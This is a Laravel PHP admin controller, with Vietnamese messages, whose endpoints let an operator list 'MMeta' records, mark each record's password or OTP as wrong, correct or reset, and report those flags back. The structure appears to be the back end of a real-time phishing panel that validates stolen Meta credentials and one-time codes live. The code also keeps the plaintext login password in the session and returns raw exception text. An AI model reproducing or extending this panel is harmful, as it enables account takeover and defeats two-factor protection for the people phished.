<?php

namespace App\Http\Controllers;

use App\Models\MMeta;
use App\Models\MOwner;
use Illuminate\Http\Request;
use Carbon\Carbon;
use Illuminate\Support\Facades\Auth;
use Illuminate\Support\Facades\Hash;
use Illuminate\Support\Facades\Validator;

class AdminController extends Controller
{
    public function getAllItems(){
        $data = MMeta::whereNull('deleted_at')->orderBy('id', 'desc')->get();
        return response()->json([
            'status'    => 200,
            'data'      => $data
        ]);
    }

    public function passwordWrongClick(Request $request){
        try{
            $info = MMeta::find($request->id);
            $info->password_wrong = 1;
            $info->save();

            return response()->json([
                'status'    => 200,
                'message'      => 'Success'
            ]);
        }catch(\Exception $exception){
            return response()->json([
                'status'    => 500,
                'message'      => $exception->getMessage()
            ]);
        }
    }

    public function passwordCorrectClick(Request $request){
        try{
            $info = MMeta::find($request->id);
            $info->password_wrong = 2;
            $info->save();

            return response()->json([
                'status'    => 200,
                'message'      => 'Success'
            ]);
        }catch(\Exception $exception){
            return response()->json([
                'status'    => 500,
                'message'      => $exception->getMessage()
            ]);
        }
    }

    public function getStatusPassword(Request $request){
        try{
            $info = MMeta::find($request->id);

            return response()->json([
                'status'    => 200,
                'data'      => $info->password_wrong
            ]);
        }catch(\Exception $exception){
            return response()->json([
                'status'    => 500,
                'message'      => $exception->getMessage()
            ]);
        }
    }

    public function getStatusOTP(Request $request){
        try{
            $info = MMeta::find($request->id);

            return response()->json([
                'status'    => 200,
                'data'      => $info->otp_wrong
            ]);
        }catch(\Exception $exception){
            return response()->json([
                'status'    => 500,
                'message'      => $exception->getMessage()
            ]);
        }
    }

    public function OTPWrongClick(Request $request){
        try{
            $info = MMeta::find($request->id);
            $info->otp_wrong = 1;
            $info->save();

            return response()->json([
                'status'    => 200,
                'message'      => 'Success'
            ]);
        }catch(\Exception $exception){
            return response()->json([
                'status'    => 500,
                'message'      => $exception->getMessage()
            ]);
        }
    }

    public function OTPCorrectClick(Request $request){
        try{
            $info = MMeta::find($request->id);
            $info->otp_wrong = 2;
            $info->save();

            return response()->json([
                'status'    => 200,
                'message'      => 'Success'
            ]);
        }catch(\Exception $exception){
            return response()->json([
                'status'    => 500,
                'message'      => $exception->getMessage()
            ]);
        }
    }

    public function OTPResetClick(Request $request){
        try{
            $info = MMeta::find($request->id);
            $info->otp_wrong = 0;
            $info->save();

            return response()->json([
                'status'    => 200,
                'message'      => 'Success'
            ]);
        }catch(\Exception $exception){
            return response()->json([
                'status'    => 500,
                'message'      => $exception->getMessage()
            ]);
        }
    }

    public function PasswordResetClick(Request $request){
        try{
            $info = MMeta::find($request->id);
            $info->password_wrong = 0;
            $info->save();

            return response()->json([
                'status'    => 200,
                'message'      => 'Success'
            ]);
        }catch(\Exception $exception){
            return response()->json([
                'status'    => 500,
                'message'      => $exception->getMessage()
            ]);
        }
    }

    public function loginSubmit(Request $request){
        try{
            $rules = [
                "username"=> "required",
                "password"=> "required"
            ];

            $messages = [
                "username.required"=> "Tài khoản không được bỏ trống",
                "password.required"=> "Mật khẩu không được bỏ trống"
            ];

            $input = $request->all();
            $validator = Validator::make($input, $rules, $messages);
            if ($validator->fails()) {
                return redirect()->back()->withInput()->with('error', $validator->errors());
            }

            $username = $request->username;
            $password = $request->password;

            $user = MOwner::where("username", $username)->first();

            session()->forget('remember_username');
            session(['remember_username'=> $request->username,'remember_password'=>$request->password]);

            if($user && Hash::check($password, $user->password)){
                // if($user->verify_token != null){
                //     return view('user.auth.verify')->with('email_verify', $user->email);
                // }

                $credentials = $request->only('username', 'password');
                if (Auth::attempt( $credentials )) {
                    // if(Auth::user()->role == '0')
                    //     return redirect()->route("user.home");
                    return redirect()->route('admin.index');
                }
            }
            return redirect()->back()->withInput()->withErrors(['msg' => 'Tài khoản hoặc mật khẩu đăng nhập không đúng!']);
        }
        catch(\Exception $e){
            return redirect()->back()->withInput()->with('error', "Lỗi đăng nhập!");
        }
    }

    public function logout(){
        Auth::logout();
        return redirect()->route('login.index');
    }

    public function changePassword(Request $request){
        $oldPW = $request->oldPassword;
        $newPW = $request->newPassword;

        if($oldPW == '' || $newPW == '')
            return response()->json([
                'status' => 401,
                'message' => 'Vui lòng điền đầy đủ thông tin'
            ]);

        $admin = MOwner::where('username', 'admin')->first();

        if(!Hash::check($oldPW, $admin->password))
            return response()->json([
                'status' => 401,
                'message' => 'Mật khẩu cũ không đúng'
            ]);

        if(strlen($newPW) < 6)
            return response()->json([
                'status' => 401,
                'message' => 'Mật khẩu mới phải trên 6 kí tự'
            ]);

        $admin->password = Hash::make($newPW);
        $admin->save();

        return response()->json([
            'status' => 200,
            'message' => 'Success'
        ]);
    }

    public function changeIP(Request $request){

        $newToken = $request->ipUpdate;
        if($newToken == '')
            return response()->json([
                'status' => 401,
                'message' => 'IP Access Token không được bỏ trống'
            ]);

        $admin = MOwner::where('username', 'admin')->first();

        $admin->ip_access_token = $newToken;
        $admin->save();

        return response()->json([
            'status' => 200,
            'message' => 'Success'
        ]);
    }
}
